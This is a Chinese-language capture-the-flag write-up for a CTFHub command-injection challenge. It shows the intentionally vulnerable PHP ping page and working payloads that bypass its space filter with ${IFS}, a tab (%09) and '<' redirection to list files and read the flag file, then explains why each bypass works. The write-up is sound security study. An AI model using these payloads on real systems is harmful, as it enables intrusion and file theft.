---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 过滤空格"
date: 2026-10-28

skill: "web-rce/command-spaces"
completed: true
---

# CTFHub Writeup - 过滤空格

## 题目类型

Web

## 题目描述

CTFHub 命令注入-过滤空格
IP :
 
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/ /", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 命令注入-过滤空格</title>
</head>
<body>

<h1>CTFHub 命令注入-过滤空格</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
show_source(__FILE__);
?>

</body>
</html>


## 解题过程

<br>1. 分析题目源码可知，参数 \`ip\` 被拼接到 \`ping -c 4 \{$ip\}\` 后交给 \`exec\` 执行，而 \`preg\_match\_all("/ /", $ip, $m)\` 只匹配 0x20 空格。传入带空格的 \`?ip=127.0.0.1;ls /var/www/html\` 会被拦截，页面回显匹配到的空格：\`Array ( \[0\] =\> Array ( \[0\] =\> ) )\`。
<br>2. 为绕过空格过滤，使用 \`$\{IFS\}\` 代替空格执行 \`ls\`：\`?ip=127.0.0.1;ls$\{IFS\}/var/www/html\`，回显中列出 \`\[9\] =\> flag\_2970219546595.php\` 和 \`\[10\] =\> index.php\`。
<br>3. 随后读取 flag 文件，记录中三种方式均实测通过；其中使用 \`$\{IFS\}\` 的请求为 \`?ip=127.0.0.1;cat$\{IFS\}/var/www/html/flag\_2970219546595.php\`，回显包含 \`\[9\] =\> \<?php // ctfhub\{f6716d43e912aabd53bc4167\}\`。

## 其他方法

记录中还验证了另外两种读取方式：重定向 \`\<\` 可写成 \`?ip=127.0.0.1;cat\</var/www/html/flag\_2970219546595.php\`；Tab 可用 URL 编码 \`%09\` 表示，写成 \`?ip=127.0.0.1;cat%09/var/www/html/flag\_2970219546595.php\`。两种方式与 \`$\{IFS\}\` 的回显一致。


## 疑问与解答

### 1.

<br>问题：为什么 \`$\{IFS\}\` 可以绕过只过滤空格的检查？
<br>解答：\`preg\_match\_all("/ /", $ip, $m)\` 仅匹配普通空格字符 0x20；\`$\{IFS\}\` 是 shell 的内部字段分隔符变量，在命令展开后会形成参数分隔效果，因此请求中不含 0x20 空格，却能让后面的 \`ls\` 或 \`cat\` 命令获得参数分隔。它并不是改变了过滤规则，而是绕开了仅针对空格字符的检查。

### 2.

<br>问题：为什么 Tab 或重定向也能在本题中替代空格？
<br>解答：shell 将 Tab 也视为空白分隔符，所以 \`cat%09/path\` 在服务端解码后形成 \`cat\<Tab\>/path\`；而 \`\<\` 是输入重定向操作符，\`cat\</path\` 不需要在 \`cat\` 与文件名之间放置空格。它们利用了源程序只检查 0x20 空格、未覆盖其他 shell 分隔或重定向语法的缺陷。


## 本题的核心逻辑：


<br>源码将用户可控的 \`ip\` 直接拼接到 \`ping -c 4 \{$ip\}\` 后交给 \`exec\`，且只检查请求中是否出现普通空格，因此存在命令注入面；使用 \`;\` 可以将原 ping 命令与后续命令串联。

<br>过滤空格并不等于过滤命令参数所需的全部空白或分隔语法；\`$\{IFS\}\`、Tab 和重定向都可以在 shell 中达成类似效果，所以只覆盖 0x20 空格的黑名单可以被绕过。


## 笔记

这道题主要学习了：

<br>1. 命令注入题应先读源码，确认用户输入进入哪种执行函数、拼接位置和过滤规则；本题的关键不是 ping 本身，而是 \`ip\` 被拼接到 shell 命令中。
<br>2. 空格过滤需要寻找 shell 层面的替代分隔方式：\`$\{IFS\}\` 可提供字段分隔，Tab 可作为空白字符，\`\<\` 重定向可在某些命令中避免空格。绕过时要根据目标命令和实际回显调整。
<br>3. 后续练习可继续关注命令注入中的其他黑名单绕过，例如过滤 cat、目录分隔符和运算符，并观察不同过滤条件下回显差异对判断的影响。
